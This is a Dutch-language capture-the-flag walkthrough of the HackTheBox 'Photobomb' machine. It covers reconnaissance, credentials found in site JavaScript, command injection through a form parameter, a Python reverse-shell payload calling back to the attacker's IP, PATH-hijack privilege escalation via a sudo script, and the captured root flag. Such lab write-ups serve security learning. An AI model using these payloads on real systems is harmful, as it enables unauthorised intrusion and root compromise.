->$ nmap -sC -sV 10.10.11.182       

Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 11:05 EST
Nmap scan report for 10.10.11.182
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.90 secon

Poort 22 ssh is open en poort 80 http is open. De OS is Ubuntu (linux)
Die een nginx web server runned.

De server geeft een redirect naar http://photobomb.htb/ -> we voegen 10.10.11.182	photobomb.htb  toe aan /etc/hosts
we bekijken de source code en zien dat een link naar /printer gedaan wordt. En dat de credentials in de starterpack zitten. 

een default login admin:admin lukt niet. Als we photobomb.js bekijken zien we dat Als een cookie matched een login gedaan wordt naar deze site met de cedentials:	pH0t0:b0Mb!

Dit geeft een platform dat toe laat om foto's te downloaden. De post request om een foto te downloaden ziet er uit als volgt.

POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 76
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

photo=finn-whelen-DTfhsDIWNSg-unsplash.jpg&filetype=jpg&dimensions=1000x1500

Er wordt een autorisatie mee gegeven in base64 (pH0t0:b0Mb!). De megegeven parameters zijn photo, filetype en dimensie. Mogelijks geeft dit een LFI vulnrebility. Als we als file name ../finn-whelen-DTFfhsDIWNSg-unsplash.jpg ingven krijgen we een error: Invalid photo.
en als we passwd ingeven krijgen we: Source photo does not exist.

Het lijk erop dat een controle gedaan wordt op / in de photonaam. Bij de photo naam hebben we allesinds geen LFI.

Als we de post paramterer filetype aanpassen van jpg naar jpg;id krijgen we als antwoord: Failed to generate a copy of finn-whelen-DTfhsDIWNSg-unsplash.jpg.

Dit antwoord duurt 700ms ipv de normale 70. Mogelijks hebben we RCE. kunnen dit proberen door een ping te versturen naar de attacher machine en een tcp dump te runnen op da attacher machine. sudo tcpdump -i tun0 icmp (tun0 is de interface dat verbonden is met de hackthebox vpn.)

het versturen van volgende post request 

POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 79
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

photo=finn-whelen-DTfhsDIWNSg-unsplash.jpg&filetype=jpg%3bping+10.10.14.76&dimensions=1000x1500

geeft geen antwoord en we krijgen op de tcpdump 

11:26:28.343156 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 34, length 64
11:26:28.343171 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 34, length 64
11:26:29.344885 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 35, length 64
11:26:29.344900 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 35, length 64
11:26:30.347385 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 36, length 64
11:26:30.347400 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 36, length 64
11:26:31.348748 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 37, length 64
11:26:31.348763 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 37, length 64
11:26:32.349694 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 38, length 64
11:26:32.349708 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 38, length 64
11:26:33.351896 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 39, length 64
11:26:33.351918 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 39, length 64
11:26:34.353537 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 40, length 64
11:26:34.353551 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 40, length 64
11:26:35.354403 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 41, length 64
11:26:35.354417 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 41, length 64
11:26:36.356401 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 42, length 64
11:26:36.356415 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 42, length 64
11:26:37.358637 IP photobomb.htb > 10.10.14.76: ICMP echo request, id 2, seq 43, length 64
11:26:37.358651 IP 10.10.14.76 > photobomb.htb: ICMP echo reply, id 2, seq 43, length 64

Als een beperkte hoeveelheid pings gestuurd wilt worden naar de attacker machine kan de flag -c 10 gebruikt worden.
We hebben effectief RCE. Nu moeten we een werkende payload zoeken om een reverse shell op te stellen met de target.

De payload export RHOST="10.10.14.76";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash"

geeft ons een reverse shell op wizard@photobomb. Er zijn twee users met shell access:

root:x:0:0:root:/root:/bin/bash
wizard:x:1000:1000:wizard:/home/wizard:/bin/bash

De wizzard gebruiker heeft access aan een cleanup.sh script in de /opt/ folder.

wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh 
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

Hier wordt find in een insecure mannier gebruikt. De correcte mannier om find te gebruiken zou zijn /usr/bin/find. Wij kunnen nu een eigen file maken die find noemt en dit aan het PATH toevoegen en zo root access te krijgen. 

als we in de tmp folder volgende commands uitvoeren:
echo "/usr/bin/id" > find  
chmod +x find

sudo PATH=/tmp /opt/cleanup.sh
/opt/.bashrc: line 13: [: command not found
/opt/.bashrc: line 20: [: command not found
/opt/.bashrc: line 26: [: command not found
/opt/.bashrc: line 50: [: command not found
/opt/.bashrc: line 63: [: command not found
/opt/cleanup.sh: line 6: [: command not found
uid=0(root) gid=0(root) groups=0(root)

We hebben dus root access. We kunnen een reverse shell opzetten naar de attacker machine om hieruit makkelijk root commands uit te voeren. In dit geval is dat niet noodzakelijk en kunnen we gewoon de root flag tonen door /usr/bin/cat /root/root.txt uit te voeren.

dit geeft de flag "e95528bc4715d2da4de10f29c1005820"


